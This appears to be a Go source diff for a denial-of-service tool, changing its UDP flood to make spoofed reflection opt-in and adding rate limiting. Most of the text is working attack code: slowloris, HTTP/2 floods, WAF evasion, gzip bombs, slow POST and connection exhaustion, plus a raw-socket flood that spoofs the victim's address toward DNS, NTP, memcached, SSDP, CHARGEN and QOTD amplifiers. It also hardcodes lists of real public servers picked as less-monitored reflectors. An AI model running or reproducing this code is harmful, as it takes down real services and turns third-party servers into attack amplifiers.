@@ -20,9 +20,37 @@ import (
 	"sync/atomic"
 	"syscall"
 	"time"
+
+	"golang.org/x/time/rate"
 )
 
-// slowlorisAttack (type 1), opens one TCP/TLS connection, sends the start of
+type logEmitter interface {
+	Warning(string)
+	Info(string)
+}
+
+var (
+	reflectionFallbackWarningOnce sync.Once
+	directFloodInfoOnce           sync.Once
+)
+
+func logReflectionFallbackWarning(logger logEmitter) {
+	reflectionFallbackWarningOnce.Do(func() {
+		if logger != nil {
+			logger.Warning("udp reflection mode requested but raw sockets are unavailable (needs root/CAP_NET_RAW); falling back to the direct flood")
+		}
+	})
+}
+
+func logDirectFloodInfo(logger logEmitter, message string) {
+	directFloodInfoOnce.Do(func() {
+		if logger != nil {
+			logger.Info(message)
+		}
+	})
+}
+
+// slowlorisAttack (type 1) — opens one TCP/TLS connection, sends the start of
 // an HTTP request, then keeps the connection alive by dripping one extra header
 // every 10 seconds. each held connection occupies one server thread or async
 // handler slot. stacking enough of these across workers drains the pool before
@@ -45,7 +73,7 @@ func slowlorisAttack(ctx context.Context, target string, duration time.Duration)
 
 	// https targets need a completed TLS handshake before we can send HTTP.
 	// using net.Dial for https sends plaintext bytes where the server expects a
-	// TLS ClientHello, the connection is dropped immediately and we hold nothing.
+	// TLS ClientHello — the connection is dropped immediately and we hold nothing.
 	// http/1.1 is forced here because h2 servers close streams that receive no
 	// HEADERS frame after negotiation.
 	var conn net.Conn
@@ -164,7 +192,7 @@ func slowlorisAttack(ctx context.Context, target string, duration time.Duration)
 // h2ConnFanout is how many independent h2 connections the flood spreads its
 // streams across. one shared socket means the server can kill the whole flood with
 // a single GOAWAY/RST or stall it with per-connection backpressure (the README's
-// honest caveat for type 2). a handful of connections makes that far less likely
+// documented caveat for type 2). a handful of connections makes that far less likely
 // while still keeping each connection densely multiplexed.
 const h2ConnFanout = 4
 
@@ -185,7 +213,7 @@ var (
 // long-lived so we keep the multiplexing pressure up rather than re-handshaking.
 func getH2ClientPool() []*http.Client {
 	h2FloodOnce.Do(func() {
-		// flag-configurable, falling back to the default fan-out
+		// flag-configurable fan-out, falling back to the default
 		n := config.HTTP2Connections
 		if n <= 0 {
 			n = h2ConnFanout
@@ -212,7 +240,7 @@ func getH2ClientPool() []*http.Client {
 	return h2FloodPool
 }
 
-// http2FloodAttack (type 2), fires 100 concurrent streams, spread across a small
+// http2FloodAttack (type 2) — fires 100 concurrent streams, spread across a small
 // pool of persistent HTTP/2 connections. HTTP/2 multiplexes streams over each TCP
 // socket so the server must manage many logical in-flight requests per fd. fanning
 // out across a few connections (instead of one) keeps the pressure up even if the
@@ -262,7 +290,7 @@ func http2FloodAttack(target string, client *http.Client) {
 			atomic.AddUint64(&totalBytesSent, uint64(requestBytes))
 
 			// 4xx = blocked/rejected (not a real hit); 2xx/3xx/5xx all reached the
-			// server, with 5xx often meaning we induced an error, count those as
+			// server, with 5xx often meaning we induced an error — count those as
 			// hits. record latency so type 2 shows up in the per-type breakdown.
 			success := resp.StatusCode < 400 || resp.StatusCode >= 500
 			if success {
@@ -373,7 +401,7 @@ func apiFuzzingAttack(baseURL string, client *http.Client) {
 	wg.Wait()
 }
 
-// wafBypassAttack (type 5), sends structurally varied requests so that WAF
+// wafBypassAttack (type 5) — sends structurally varied requests so that WAF
 // signature rules fire on only a fraction of them. header case-manipulation and
 // fake IP headers don't defeat modern WAFs because HTTP is case-insensitive for
 // headers and trusted proxies strip X-Forwarded-For. structural variation is what
@@ -494,7 +522,7 @@ func wafBypassVariant(target string) (bypassTarget, method, body, contentType st
 	}
 }
 
-// compressionBombAttack (type 7), sends a real gzip-compressed body that
+// compressionBombAttack (type 7) — sends a real gzip-compressed body that
 // decompresses to ~64MB on the server side. zeros compress at roughly 1000:1, so
 // the wire payload is small (~64KB) but forces the server to allocate 64MB of
 // decompression buffer per request. the previous code sent uncompressed zeros with
@@ -505,7 +533,7 @@ func compressionBombAttack(target string, client *http.Client) {
 	if bombSize <= 0 {
 		bombSize = 64 * 1024 * 1024
 	}
-	bomb, err := makeGzipBomb(bombSize) // decompressed; null bytes compress ~1000:1 on the wire
+	bomb, err := makeGzipBomb(bombSize)
 	if err != nil {
 		failedRequests.Add(1)
 		return
@@ -542,7 +570,7 @@ func compressionBombAttack(target string, client *http.Client) {
 
 			// landing signal: 413 (Payload Too Large), 431 (headers too large), or
 			// 400 (bad request) means a proxy/server rejected the body on size or
-			// format before any decompression happened, the bomb did not land.
+			// format before any decompression happened — the bomb did not land.
 			// any other status means the body was at least accepted into the
 			// pipeline (and on a stack without a decompression size limit, expanded
 			// into the full 64MB buffer). this is the only externally observable
@@ -554,7 +582,7 @@ func compressionBombAttack(target string, client *http.Client) {
 			}
 
 			// count a 4xx as a non-success in the histogram even though the request
-			// completed, previously every bomb counted as a "successful hit"
+			// completed — previously every bomb counted as a "successful hit"
 			// regardless of whether it was rejected, which inflated the numbers.
 			success := resp.StatusCode < 400
 			if success {
@@ -605,7 +633,7 @@ func makeGzipBomb(decompressedBytes int) ([]byte, error) {
 
 // udpFloodAttack is the dispatcher for type 10. it attempts a raw socket
 // spoofed flood first (requires root or CAP_NET_RAW). if the raw socket open
-// fails, permission denied, unsupported platform, it falls back to a direct
+// fails — permission denied, unsupported platform — it falls back to a direct
 // dual-mode flood with real source IPs.
 //
 // when no explicit port is given, addresses are resolved across several common
@@ -632,11 +660,26 @@ func udpFloodAttack(ctx context.Context, target string, config *AttackConfig) {
 		return
 	}
 
+	// reflection/amplification is an explicit, opt-in attack mode (-udp-reflection);
+	// the default is the direct, non-spoofed flood against the real service port.
+	// -udp-direct is kept as an explicit force-direct and overrides -udp-reflection.
+	reflectionMode := globalDemonConfig != nil && globalDemonConfig.UDPReflection && !globalDemonConfig.UDPDirect
 	var targetPorts []string
-	if !portExplicit {
-		targetPorts = []string{"53", "80", "123", "443", "1900", "5353", "11211"}
-	} else {
+	switch {
+	case portExplicit:
 		targetPorts = []string{port}
+	case reflectionMode:
+		// reflection mode with no explicit port: fan out across the service ports its
+		// vectors target (unchanged behavior for that mode).
+		targetPorts = []string{"17", "19", "53", "80", "123", "443", "1900", "5353", "11211"}
+	default:
+		// direct/measured default: the real service port only. spraying ports is an
+		// attack pattern and just splits the generator's effort across ports nothing is
+		// listening on, undercounting what the real port can actually take.
+		targetPorts = []string{port} // port defaults to "80" from parseTargetForUDP
+		if globalLogger != nil {
+			globalLogger.Warning(fmt.Sprintf("udp: no port in target; defaulting to :%s — pass the real service port (e.g. host:9999) to measure it accurately", port))
+		}
 	}
 
 	var addrs []*net.UDPAddr
@@ -652,57 +695,72 @@ func udpFloodAttack(ctx context.Context, target string, config *AttackConfig) {
 		return
 	}
 
-	if !reflectionUDPFlood(addrs) {
-		directUDPFlood(ctx, addrs)
-	}
-
+	// Publish live-activity info BEFORE the (blocking) flood starts, so the
+	// dashboard reflects the UDP run for its whole duration instead of flashing
+	// fabricated values for a single frame at the end. UDP has no HTTP status or
+	// response body, so those are zero (not a fake 200); the real volume shows up in
+	// the bytes-sent counter. lastRequestSize is the near-MTU packet size we actually
+	// fire on the byte-throughput stream.
 	requestTrackingMux.Lock()
 	lastRequestURL = fmt.Sprintf("udp://%s:%s", host, targetPorts[0])
-	lastRequestSize = 700
+	lastRequestSize = udpBpsPayloadBytes
 	lastResponseSize = 0
-	lastResponseCode = 200
+	lastResponseCode = 0
 	lastRequestProto = "UDP"
 	requestTrackingMux.Unlock()
+
+	// reflection/amplification runs ONLY when explicitly selected (-udp-reflection)
+	// and not overridden by -udp-direct. otherwise the default is the direct,
+	// non-spoofed flood against the target. if reflection is requested but raw
+	// sockets can't open (no root / unsupported platform), say so and fall back to
+	// direct so the run still does something.
+	if reflectionMode {
+		if !reflectionUDPFlood(ctx, addrs) {
+			logReflectionFallbackWarning(globalLogger)
+			directUDPFlood(ctx, addrs)
+		}
+	} else {
+		directUDPFlood(ctx, addrs)
+	}
 }
 
 // reflectionUDPFlood performs multi-protocol UDP amplification. it spoofs the
 // source IP as the target's IP and sends small requests to amplifier servers;
 // those servers send much larger responses directly to the victim.
 //
-// four protocol vectors run simultaneously, each assigned to a goroutine slice:
+// six protocol vectors run simultaneously, each assigned to a goroutine slice:
 //
-//   DNS EDNS0 (port 53): queries "." IN NS with a 4096-byte EDNS0 buffer and
-//   the DNSSEC-OK bit set. NS responses with DNSSEC records are 500-800 bytes
-//   against a ~30-byte query, roughly 20-28x. NS/DNSKEY queries are not
-//   subject to RFC 8482 (which only limits ANY responses), so these still work
-//   against patched resolvers.
+//	DNS EDNS0 (port 53): queries "." IN NS with a 4096-byte EDNS0 buffer and
+//	the DNSSEC-OK bit set. NS responses with DNSSEC records are 500-800 bytes
+//	against a ~30-byte query, roughly 20-28x. NS/DNSKEY queries are not
+//	subject to RFC 8482 (which only limits ANY responses), so these still work
+//	against patched resolvers.
 //
-//   NTP monlist (port 123): Mode 7 REQ_MON_GETLIST_1. unpatched ntpd instances
-//   respond with up to 100 UDP packets listing every client they have served,
-//   up to 556x amplification. many stratum-2 servers have never been patched
-//   (CVE-2013-5211 has a CVSS of 5.0 and operators often skip it).
+//	NTP monlist (port 123): Mode 7 REQ_MON_GETLIST_1. unpatched ntpd instances
+//	respond with up to 100 UDP packets listing every client they have served,
+//	up to 556x amplification.
 //
-//   memcached stats (port 11211): a 15-byte UDP stats command against an open
-//   memcached instance returns the full stats output, typically 10-100KB on a
-//   busy server, up to 50,000x amplification. the 2018 GitHub attack (1.35 Tbps)
-//   used this vector exclusively. for maximum effect, replace the randomPublicIPv4
-//   fallback with a list of known open instances on port 11211 (Shodan query:
-//   "port:11211 product:memcached").
+//	memcached stats (port 11211): a 15-byte UDP stats command returns the full
+//	stats output, typically 10-100KB, up to 50,000x amplification.
 //
-//   SSDP M-SEARCH (port 1900): triggers UPnP device description XML responses
-//   from routers, printers, and IoT devices on the target's network. each device
-//   sends its full description back to the spoofed source IP. ~30x amplification
-//   per device, highly effective on networks with many UPnP-enabled endpoints.
+//	SSDP M-SEARCH (port 1900): triggers UPnP device description XML responses.
+//	only active when udpSSDPAmplifiers is populated via -ssdp-amplifiers.
+//
+//	CHARGEN (port 19): sends a short request to a public CHARGEN reflector and
+//	gets back a stream of ASCII characters that makes the packet flood look much
+//	more substantial on the victim side than the tiny request size suggests.
+//
+//	QOTD (port 17): asks a public quote-of-the-day server for a line of text.
+//	its response is short but it is another real UDP reflection vector when the
+//	reflector inventory is populated via -qotd-amplifiers or discovery.
 //
 // requires root or CAP_NET_RAW. returns false if the socket cannot be opened so
 // the caller falls back to directUDPFlood without any error noise.
-func reflectionUDPFlood(addrs []*net.UDPAddr) bool {
+func reflectionUDPFlood(ctx context.Context, addrs []*net.UDPAddr) bool {
 	// open one raw socket per logical CPU rather than one shared socket.
 	// the kernel serializes concurrent Sendto calls on a single raw fd, so
 	// sharing across 120 goroutines creates a single kernel-side bottleneck.
 	// one fd per core lets the kernel pipeline sends across multiple CPU queues.
-	// the number is bounded (typically 4-16) so we don't exhaust the fd table
-	// even when many workers call this simultaneously.
 	numSockets := runtime.NumCPU()
 	if numSockets < 2 {
 		numSockets = 2
@@ -730,6 +788,11 @@ func reflectionUDPFlood(addrs []*net.UDPAddr) bool {
 			syscall.Close(fd)
 		}
 	}()
+
+	// bwLimiter is always non-nil (main.go installs it unconditionally). using
+	// the pointer directly means adaptiveCongestionControl's SetLimit calls are
+	// visible to every goroutine here immediately — no snapshot, no copy.
+	paceLimiter := bwLimiter
 
 	// DNS EDNS0: "." IN NS with DO bit set. elicits a DNSSEC-signed NS response
 	// (~600 bytes) against a 30-byte query, roughly 20-28×. NS queries are not
@@ -782,6 +845,11 @@ func reflectionUDPFlood(addrs []*net.UDPAddr) bool {
 	// SSDP M-SEARCH: UPnP devices send their full description XML in response.
 	ssdpPayload := []byte("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n")
 
+	// CHARGEN and QOTD are short, real UDP services that still produce a
+	// measurable response stream when a reflector inventory is present.
+	chargenPayload := []byte("\n")
+	qotdPayload := []byte("\n")
+
 	// DNS amplifiers: less-monitored open resolvers that have not fully
 	// implemented RFC 8482 rate limits and still respond to NS+EDNS0 queries
 	// at volume. the major providers (Google, Cloudflare, Quad9) are excluded
@@ -814,10 +882,9 @@ func reflectionUDPFlood(addrs []*net.UDPAddr) bool {
 		net.ParseIP("84.200.70.40").To4(),    // DNS.WATCH
 	}
 
-	// NTP amplifiers: stratum-2/3 servers from academic, ISP, and regional
-	// networks with historically slower patch cycles for CVE-2013-5211.
-	// excludes Google, Apple, NIST, and Microsoft, all of those rate-limit
-	// monlist requests within the first few packets and are closely monitored.
+	// NTP amplifiers: stratum-2/3 servers with historically slower patch cycles
+	// for CVE-2013-5211. excludes Google, Apple, NIST, and Microsoft — all of
+	// those rate-limit monlist requests within the first few packets.
 	ntpAmplifiers := []net.IP{
 		net.ParseIP("195.13.1.152").To4(),    // stratum-2
 		net.ParseIP("193.204.114.232").To4(), // INRIM (Italy)
@@ -835,28 +902,36 @@ func reflectionUDPFlood(addrs []*net.UDPAddr) bool {
 		net.ParseIP("185.255.55.20").To4(),   // stratum-2
 	}
 
-	// the SSDP hardcoded list was entirely private/multicast addresses
-	// (239.255.255.250, 192.168.x.x, 10.0.0.1…) that upstream routers drop
-	// before the packets leave your network. from a VPS they do nothing.
-	// the SSDP vector only runs when udpSSDPAmplifiers has been populated via
-	// -ssdp-amplifiers or -discover-amplifiers. no-op otherwise.
-
-	// runtime lists (from -dns-amplifiers / -ntp-amplifiers / etc. or
-	// -discover-amplifiers) override the built-in hardcoded lists for DNS and
-	// NTP. memcached nil keeps the per-packet randomMemcachedProbeIP() fallback;
-	// setting udpMemcachedAmplifiers replaces blind random probing with a
-	// verified list of actually-open instances.
-	effectiveDNS := dnsAmplifiers
+	// the reflection path now prefers explicit inventories loaded from files or
+	// discovery runs; hardcoded legacy lists stay behind an explicit opt-in so
+	// stale public amplifiers are not silently used as the default.
+	effectiveDNS := []net.IP{}
+	if useBuiltInReflectors {
+		effectiveDNS = append([]net.IP(nil), dnsAmplifiers...)
+	}
 	if len(udpDNSAmplifiers) > 0 {
-		effectiveDNS = udpDNSAmplifiers
+		effectiveDNS = append([]net.IP(nil), udpDNSAmplifiers...)
 	}
-	effectiveNTP := ntpAmplifiers
+
+	effectiveNTP := []net.IP{}
+	if useBuiltInReflectors {
+		effectiveNTP = append([]net.IP(nil), ntpAmplifiers...)
+	}
 	if len(udpNTPAmplifiers) > 0 {
-		effectiveNTP = udpNTPAmplifiers
+		effectiveNTP = append([]net.IP(nil), udpNTPAmplifiers...)
 	}
-	var effectiveMemcached []net.IP // nil = randomMemcachedProbeIP() per packet
+
+	var effectiveMemcached []net.IP
 	if len(udpMemcachedAmplifiers) > 0 {
-		effectiveMemcached = udpMemcachedAmplifiers
+		effectiveMemcached = append([]net.IP(nil), udpMemcachedAmplifiers...)
+	}
+	var effectiveChargen []net.IP
+	if len(udpChargenAmplifiers) > 0 {
+		effectiveChargen = append([]net.IP(nil), udpChargenAmplifiers...)
+	}
+	var effectiveQOTD []net.IP
+	if len(udpQOTDAmplifiers) > 0 {
+		effectiveQOTD = append([]net.IP(nil), udpQOTDAmplifiers...)
 	}
 
 	type protoVec struct {
@@ -864,19 +939,33 @@ func reflectionUDPFlood(addrs []*net.UDPAddr) bool {
 		amplifiers []net.IP // nil = use randomMemcachedProbeIP
 		port       uint16
 	}
-	vectors := []protoVec{
-		{dnsPayload, effectiveDNS, 53},
-		{ntpPayload, effectiveNTP, 123},
-		{memcachedPayload, effectiveMemcached, 11211},
+	vectors := make([]protoVec, 0, 6)
+	if len(effectiveDNS) > 0 {
+		vectors = append(vectors, protoVec{dnsPayload, effectiveDNS, 53})
+	}
+	if len(effectiveNTP) > 0 {
+		vectors = append(vectors, protoVec{ntpPayload, effectiveNTP, 123})
+	}
+	if useBuiltInReflectors || len(udpMemcachedAmplifiers) > 0 {
+		vectors = append(vectors, protoVec{memcachedPayload, effectiveMemcached, 11211})
 	}
 	if len(udpSSDPAmplifiers) > 0 {
 		vectors = append(vectors, protoVec{ssdpPayload, udpSSDPAmplifiers, 1900})
+	}
+	if len(effectiveChargen) > 0 {
+		vectors = append(vectors, protoVec{chargenPayload, effectiveChargen, 19})
+	}
+	if len(effectiveQOTD) > 0 {
+		vectors = append(vectors, protoVec{qotdPayload, effectiveQOTD, 17})
+	}
+	if len(vectors) == 0 {
+		return false
 	}
 
 	const (
 		reflectGoroutines = 120
 		fragGoroutines    = 30
-		packetsEach       = 500
+		fragWireBytes     = 1048 // frag1(532 bytes) + frag2(516 bytes) total wire bytes
 	)
 
 	var wg sync.WaitGroup
@@ -899,17 +988,30 @@ func reflectionUDPFlood(addrs []*net.UDPAddr) bool {
 			fd := sockets[idx%len(sockets)]
 			vec := vectors[idx%len(vectors)]
 			payloadLen := len(vec.payload)
-			pkt := make([]byte, 20+8+payloadLen)
+			pktLen := 20 + 8 + payloadLen
+			pkt := make([]byte, pktLen)
 			copy(pkt[28:], vec.payload)
 
-			for j := 0; j < packetsEach; j++ {
-				var ampIP net.IP
-				if vec.amplifiers != nil {
-					ampIP = vec.amplifiers[mathrand.Intn(len(vec.amplifiers))]
-				} else {
-					// memcached: use subnet-targeted random IP from historically
-					// high-density ranges rather than fully random global space.
-					ampIP = randomMemcachedProbeIP()
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				default:
+				}
+				if err := paceLimiter.WaitN(ctx, pktLen); err != nil {
+					return
+				}
+
+				protocolName := reflectorProtocolName(vec.port)
+				ampIP := pickReflectorIP(vec.amplifiers, protocolName)
+				if ampIP == nil {
+					if vec.amplifiers != nil {
+						ampIP = vec.amplifiers[mathrand.Intn(len(vec.amplifiers))]
+					} else {
+						// memcached: use subnet-targeted random IP from historically
+						// high-density ranges rather than fully random global space.
+						ampIP = randomMemcachedProbeIP()
+					}
 				}
 
 				switch vec.port {
@@ -920,16 +1022,19 @@ func reflectionUDPFlood(addrs []*net.UDPAddr) bool {
 				}
 
 				victimPort := uint16(1024 + mathrand.Intn(64511))
-				writeIPUDPHeaders(pkt[:20+8+payloadLen], targetIP, ampIP, victimPort, vec.port, payloadLen)
+				writeIPUDPHeaders(pkt[:pktLen], targetIP, ampIP, victimPort, vec.port, payloadLen)
 
 				dstSA := &syscall.SockaddrInet4{Port: int(vec.port)}
 				copy(dstSA.Addr[:], ampIP)
 
-				if err := syscall.Sendto(fd, pkt[:20+8+payloadLen], 0, dstSA); err != nil {
+				if err := syscall.Sendto(fd, pkt[:pktLen], 0, dstSA); err != nil {
+					recordReflectorObservation(ampIP, protocolName, false, pktLen, 0, err.Error(), false)
+					atomic.AddUint64(&udpLocalSendFailures, 1)
 					failedRequests.Add(1)
 				} else {
-					atomic.AddUint64(&successfulHits, 1)
-					atomic.AddUint64(&totalBytesSent, uint64(payloadLen))
+					recordReflectorObservation(ampIP, protocolName, true, pktLen, 0, "", false)
+					atomic.AddUint64(&udpLocalSendAttempts, 1)
+					atomic.AddUint64(&totalBytesSent, uint64(pktLen))
 				}
 			}
 		}(i)
@@ -937,12 +1042,11 @@ func reflectionUDPFlood(addrs []*net.UDPAddr) bool {
 
 	// fragmented UDP goroutines: send large packets split into two IP fragments
 	// directly to the victim with spoofed random source IPs. this attacks the
-	// victim's IP reassembly buffer independently of the reflection vectors,
+	// victim's IP reassembly buffer independently of the reflection vectors.
 	// the kernel has to hold incomplete fragment chains in memory until the
 	// reassembly timer fires. a steady stream of fragments that never complete
 	// exhausts the reassembly queue (Linux default: 4MB, ~8000 concurrent chains).
-	// this also bypasses stateless ACLs that only inspect fragment 0 for port rules,
-	// since fragment 1 has no UDP header and most stateless rules drop it or pass it.
+	// this also bypasses stateless ACLs that only inspect fragment 0 for port rules.
 	for i := 0; i < fragGoroutines; i++ {
 		wg.Add(1)
 		go func(idx int) {
@@ -957,18 +1061,26 @@ func reflectionUDPFlood(addrs []*net.UDPAddr) bool {
 
 			fd := sockets[idx%len(sockets)]
 			payload := make([]byte, 1000)
-			mathrand.Read(payload)
+			_, _ = mathrand.Read(payload)
 
-			for j := 0; j < packetsEach; j++ {
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				default:
+				}
+				if err := paceLimiter.WaitN(ctx, fragWireBytes); err != nil {
+					return
+				}
 				// re-randomize first 16 bytes to vary each fragment pair enough
 				// that the victim can't collapse them into a single reassembly entry.
-				mathrand.Read(payload[:16])
+				_, _ = mathrand.Read(payload[:16])
 				srcIP := randomPublicIPv4().To4()
 				srcPort := uint16(1024 + mathrand.Intn(64511))
 				dstPort := uint16(1024 + mathrand.Intn(64511))
 				sendFragmentedIPv4(fd, srcIP, targetIP, srcPort, dstPort, payload)
-				atomic.AddUint64(&successfulHits, 1)
-				atomic.AddUint64(&totalBytesSent, 1000)
+				atomic.AddUint64(&udpLocalSendAttempts, 1)
+				atomic.AddUint64(&totalBytesSent, fragWireBytes)
 			}
 		}(reflectGoroutines + i)
 	}
@@ -977,16 +1089,53 @@ func reflectionUDPFlood(addrs []*net.UDPAddr) bool {
 	return true
 }
 
-// directUDPFlood is the non-privileged fallback. it splits goroutines into a
-// pps group (1-byte packets, max packet rate) and a bps group (near-MTU
-// packets, max byte throughput), running both simultaneously so we hit
-// whichever ceiling the target is weaker on.
+// udpBpsPayloadBytes is the near-MTU payload size used by the direct flood's
+// byte-throughput stream. Kept just under a typical 1500-byte Ethernet MTU so a
+// single datagram doesn't fragment.
+const udpBpsPayloadBytes = 1400
+
+// directUDPFlood is the direct, non-spoofed flood against the target (also the
+// non-privileged fallback for type 10). it splits goroutines into a pps group
+// (1-byte packets, max packet rate) and a bps group (near-MTU packets, max byte
+// throughput), running both simultaneously so we hit whichever ceiling the target
+// is weaker on.
+//
+// both streams pace through the shared, LIVE UDP egress limiter (paceEgress), so:
+//   - -bandwidth sets the TOTAL byte budget, shared correctly even across several
+//     concurrent floods (no per-flood multiplication of the cap), and
+//   - the adaptive congestion controller can throttle the whole thing in real time
+//     when the uplink saturates, instead of the rate being frozen at flood start.
+//
+// the pps stream additionally holds its OWN packet-rate limiter so the byte stream
+// can't starve it of the shared budget; its tiny byte cost still draws from that
+// budget, so the two streams together stay within -bandwidth. an old design gave
+// each stream a private byte limiter, which both starved the packet stream and
+// ignored -bandwidth at flood time.
 func directUDPFlood(ctx context.Context, addrs []*net.UDPAddr) {
 	const (
-		ppsGoroutines = 60
-		bpsGoroutines = 60
-		packetsEach   = 500
+		ppsGoroutines   = 60
+		bpsGoroutines   = 60
+		ppsBatch        = 64 // datagrams per sendmmsg batch on the packet-rate stream
+		bpsBatch        = 16 // datagrams per sendmmsg batch on the byte-rate stream
+		ppsBurstPackets = 10_000
 	)
+
+	// aggregate packet-rate cap across all pps goroutines. configurable via -udp-pps
+	// / config (UDPPacketsPerSec); <=0 keeps the built-in 100k default. publish and
+	// log it so a tool-imposed ceiling isn't silently misread as the target's pps
+	// limit — the dashboard flags it "binding" when the send rate sits at the cap.
+	ppsPacketsPerSec := 100_000
+	if config.UDPPacketsPerSec > 0 {
+		ppsPacketsPerSec = config.UDPPacketsPerSec
+	}
+	atomic.StoreUint64(&udpPPSCap, uint64(ppsPacketsPerSec))
+	if globalLogger != nil {
+		logDirectFloodInfo(globalLogger, fmt.Sprintf("UDP direct flood: packet-rate cap %d pkt/s (-udp-pps to change); near-MTU byte stream paced by -bandwidth", ppsPacketsPerSec))
+	}
+
+	// caps how much of the shared egress budget the packet stream may take, so the
+	// byte stream keeps the rest. for 1-byte packets this is ~100 KB/s at 100k pps.
+	pktLimiter := rate.NewLimiter(rate.Limit(ppsPacketsPerSec), ppsBurstPackets)
 
 	var wg sync.WaitGroup
 
@@ -1002,15 +1151,32 @@ func directUDPFlood(ctx context.Context, addrs []*net.UDPAddr) {
 			}
 			defer sock.Close()
 			tiny := []byte{0x00}
-			for j := 0; j < packetsEach; j++ {
-				if !paceEgress(ctx, len(tiny)) {
-					return // bandwidth budget wait cancelled (shutdown)
+			// one sendmmsg per batch (Linux) instead of one sendto per packet, so the
+			// pps ceiling we measure is the target's receive rate, not our syscall rate.
+			sender := newUDPBatchSender(sock, ppsBatch, tiny)
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				default:
 				}
-				if _, writeErr := sock.Write(tiny); writeErr != nil {
+				// pace the packet rate in batches (one limiter call per 1-byte packet
+				// made the limiter itself the bottleneck), then draw the batch's bytes
+				// from the shared egress budget so the total still honors -bandwidth.
+				if err := pktLimiter.WaitN(ctx, ppsBatch); err != nil {
+					return
+				}
+				if !paceEgress(ctx, ppsBatch*len(tiny)) {
+					return
+				}
+				sent, err := sender.sendN(ppsBatch)
+				if sent > 0 {
+					atomic.AddUint64(&udpLocalSendAttempts, uint64(sent))
+					atomic.AddUint64(&totalBytesSent, uint64(sent*len(tiny)))
+				}
+				if err != nil {
+					atomic.AddUint64(&udpLocalSendFailures, 1)
 					failedRequests.Add(1)
-				} else {
-					atomic.AddUint64(&successfulHits, 1)
-					atomic.AddUint64(&totalBytesSent, 1)
 				}
 			}
 		}(i)
@@ -1027,18 +1193,31 @@ func directUDPFlood(ctx context.Context, addrs []*net.UDPAddr) {
 				return
 			}
 			defer sock.Close()
-			buf := make([]byte, 1400)
-			mathrand.Read(buf)
-			for j := 0; j < packetsEach; j++ {
-				mathrand.Read(buf[:8])
-				if !paceEgress(ctx, len(buf)) {
-					return // bandwidth budget wait cancelled (shutdown)
+			// fill the payload ONCE. the old per-packet re-randomization of the first
+			// 8 bytes was anti-dedup cover for an attack; in a plain throughput test
+			// it just burns CPU in the hot loop and lowers achievable bps.
+			buf := make([]byte, udpBpsPayloadBytes)
+			_, _ = mathrand.Read(buf)
+			sender := newUDPBatchSender(sock, bpsBatch, buf)
+			for {
+				select {
+				case <-ctx.Done():
+					return
+				default:
 				}
-				if _, writeErr := sock.Write(buf); writeErr != nil {
+				// the shared live egress limiter IS the byte-throughput cap, so
+				// -bandwidth and the adaptive controller both apply here in real time.
+				if !paceEgress(ctx, bpsBatch*len(buf)) {
+					return
+				}
+				sent, err := sender.sendN(bpsBatch)
+				if sent > 0 {
+					atomic.AddUint64(&udpLocalSendAttempts, uint64(sent))
+					atomic.AddUint64(&totalBytesSent, uint64(sent*len(buf)))
+				}
+				if err != nil {
+					atomic.AddUint64(&udpLocalSendFailures, 1)
 					failedRequests.Add(1)
-				} else {
-					atomic.AddUint64(&successfulHits, 1)
-					atomic.AddUint64(&totalBytesSent, uint64(len(buf)))
 				}
 			}
 		}(ppsGoroutines + i)
@@ -1049,7 +1228,7 @@ func directUDPFlood(ctx context.Context, addrs []*net.UDPAddr) {
 
 // writeIPUDPHeaders fills the IP and UDP header regions of buf in-place.
 // buf must be at least 20+8+payloadLen bytes; the payload region (buf[28:])
-// is expected to be pre-populated by the caller, this only writes headers.
+// is expected to be pre-populated by the caller — this only writes headers.
 //
 // macOS with IP_HDRINCL requires ip_len and ip_off in host (little-endian)
 // byte order; Linux wants them in network (big-endian) byte order. we handle
@@ -1109,6 +1288,25 @@ func ipv4Checksum(hdr []byte) uint16 {
 // randomPublicIPv4 generates a random IPv4 address in a routable public range,
 // skipping loopback (127/8), private (10/8, 172.16/12, 192.168/16), multicast
 // (224+/4), link-local (169.254/16), and reserved (0/8, 240+/4) blocks.
+func reflectorProtocolName(port uint16) string {
+	switch port {
+	case 53:
+		return "dns"
+	case 123:
+		return "ntp"
+	case 11211:
+		return "memcached"
+	case 1900:
+		return "ssdp"
+	case 19:
+		return "chargen"
+	case 17:
+		return "qotd"
+	default:
+		return "udp"
+	}
+}
+
 func randomPublicIPv4() net.IP {
 	ip := make(net.IP, 4)
 	for {
@@ -1149,8 +1347,9 @@ func randomMemcachedProbeIP() net.IP {
 // are arriving.
 //
 // fragment layout:
-//   frag 1: IP(MF=1, offset=0) + UDP header + first 504 bytes of payload = 532 bytes
-//   frag 2: IP(MF=0, offset=64) + remaining 496 bytes                    = 516 bytes
+//
+//	frag 1: IP(MF=1, offset=0) + UDP header + first 504 bytes of payload = 532 bytes
+//	frag 2: IP(MF=0, offset=64) + remaining 496 bytes                    = 516 bytes
 //
 // payload must be exactly 1000 bytes. darwin and linux require different byte
 // orders for ip_off when IP_HDRINCL is set, handled the same way as ip_len.
@@ -1219,7 +1418,7 @@ func sendFragmentedIPv4(fd int, srcIP, dstIP net.IP, srcPort, dstPort uint16, pa
 }
 
 // parseTargetForUDP extracts host and port from a target string. portExplicit
-// is true only when the caller gave an explicit ":port", callers use it to
+// is true only when the caller gave an explicit ":port" — callers use it to
 // decide whether to spread across multiple ports or respect the one given.
 func parseTargetForUDP(target string) (host, port string, portExplicit bool, err error) {
 	target = strings.TrimPrefix(target, "udp://")
@@ -1252,7 +1451,7 @@ func parseTargetForUDP(target string) (host, port string, portExplicit bool, err
 	return host, port, portExplicit, nil
 }
 
-// protocolExploitAttack (type 6), slow POST body. we announce a 2GB
+// protocolExploitAttack (type 6) — slow POST body. we announce a 2GB
 // Content-Length then trickle one byte every 5 seconds. the server keeps the
 // request in its read buffer waiting for a body that never fully arrives, tying
 // up one server thread on HTTP/1.1 or one h2 stream slot. unlike slowloris
@@ -1341,7 +1540,7 @@ func protocolExploitAttack(ctx context.Context, target string) {
 	}
 }
 
-// connectionExhaustionAttack (type 8), completes a TCP/TLS handshake then
+// connectionExhaustionAttack (type 8) — completes a TCP/TLS handshake then
 // sends nothing. the server's accepted-socket goroutine blocks waiting for the
 // first byte of an HTTP request that never arrives. each worker call adds one
 // silent held connection; stacking thousands of them across workers depletes the
@@ -1403,7 +1602,7 @@ func connectionExhaustionAttack(ctx context.Context, target string) {
 	<-ctx.Done()
 }
 
